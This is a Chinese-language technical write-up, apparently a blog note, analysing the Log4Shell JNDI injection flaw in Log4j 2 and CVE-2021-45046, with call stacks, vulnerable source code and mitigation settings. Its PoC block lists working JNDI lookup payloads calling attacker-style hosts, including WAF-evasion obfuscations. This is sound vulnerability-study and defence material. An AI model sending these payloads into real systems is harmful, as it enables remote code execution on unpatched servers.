---
title: "Log4shell"
author: ["4shen0ne"]
lastmod: 2024-12-14T01:38:32+08:00
draft: false
---

Log4j 2 提供了属性替换特性，在配置文件中可以使用 `${name}` 这样的语法，从文件任意
位置引用属性值。而且为了从不同上下文环境中引用，还支持 `${prefix:name}`, 用 prefix
来指定上下文，然后通过 lookups 特性从远程获取需要的值进行属性替换

官方文档：

1.  <https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution>
2.  <https://logging.apache.org/log4j/2.x/manual/lookups.html>

由于 prefix 支持 [JNDI]({{< relref "jndi.md" >}}), 而且地址(name)是完全可控的，而且 log4j 2 在记录日志时对
${} 语法进行了解析，综上原因导致了极其容易利用的 JNDI 注入

poc:

```nil
# basic
${jndi:ldap://evil.dnslog.cn}

# bypass rc1
${jndi:ldap://127.0.0.1:1389/ badClassName}

# bypass waf
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```


## 相关执行流程 {#相关执行流程}

关键流程的调用栈：

```nil
lookup:54, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
...
```

MessagePatternConverter#format 关键代码：

```java
if (this.config != null && !this.noLookups) {
    for(int i = offset; i < workingBuilder.length() - 1; ++i) {
        if (workingBuilder.charAt(i) == '$' && workingBuilder.charAt(i + 1) == '{') {
            String value = workingBuilder.substring(offset, workingBuilder.length());
            workingBuilder.setLength(offset);
            workingBuilder.append(this.config.getStrSubstitutor().replace(event, value));
        }
    }
}
```

判断条件中的 this.noLookups 由后面提到的 formatMsgNoLookups 属性来设置

遇到 `${` 开头的字符串会进入 StrSubstitutor 对模板语法进行解析，解析逻辑和 waf
bypass 的构造有关联，然后在 Interpolator#lookup 处理并发送 JNDI 请求


## 修复 {#修复}

Log4j 提供了 formatMsgNoLookups 属性来禁用 lookups 特性，可以通过下述方式设置：

1.  jvm 参数 -Dlog4j2.formatMsgNoLookups=true
2.  配置文件设置 log4j2.formatMsgNoLookups=True
3.  环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true

高版本 JDK 提供了 com.sun.jndi.ldap.object.trustURLCodebase 属性且默认为 false,
JVM 不会信任 [LDAP]({{< relref "ldap.md" >}}) 对象反序列化过程中从远程 [codebase]({{< relref "java_codebase.md" >}}) 加载的类。但是依然可以利用本
地类的反序列化 gadget 进行利用


## CVE-2021-45046 {#cve-2021-45046}

Log4j 2 有一个概念是线程上下文(Thread Context), 主要是用来区分和追踪不同客户端的
相关日志，并通过 Thread Context Map 和 Thread Context Stack 两个机制来存储相关标
记，而 PatternLayout 提供了相关的机制来获取线程上下文中存放的键值

官方文档：<https://logging.apache.org/log4j/2.x/manual/thread-context.html>

在 PatternLayout 获取 ThreadContext 的值时，如果包含 `${}` 表示的变量就会进行解析，
而且解析过程不受 formatMsgNoLookups 属性的限制，造成 JNDI 注入。但前提是攻击者有
办法控制 ThreadContext 中的数据

关键流程：

```nil
lookup:54, JndiLookup (org.apache.logging.log4j.core.lookup)
lookup:221, Interpolator (org.apache.logging.log4j.core.lookup)
resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) [2]
substitute:1042, StrSubstitutor (org.apache.logging.log4j.core.lookup) [1]
substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup)
replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup)
format:60, LiteralPatternConverter (org.apache.logging.log4j.core.pattern)
format:38, PatternFormatter (org.apache.logging.log4j.core.pattern)
...
```

LiteralPatternConverter 的关键代码如下：

```java
public LiteralPatternConverter(final Configuration config, final String literal, final boolean convertBackslashes) {
    super("Literal", "literal");
    this.literal = convertBackslashes ? OptionConverter.convertSpecialChars(literal) : literal;
    this.config = config;
    this.substitute = config != null && literal.contains("${");
}

public void format(final LogEvent event, final StringBuilder toAppendTo) {
    toAppendTo.append(this.substitute ? this.config.getStrSubstitutor().replace(event, this.literal) : this.literal);
}
```

如果 literal 属性包含 `${`, 就进入 StrSubstitutor#replace 方法导致注入

相关项目：<https://github.com/Cybereason/Logout4Shell>
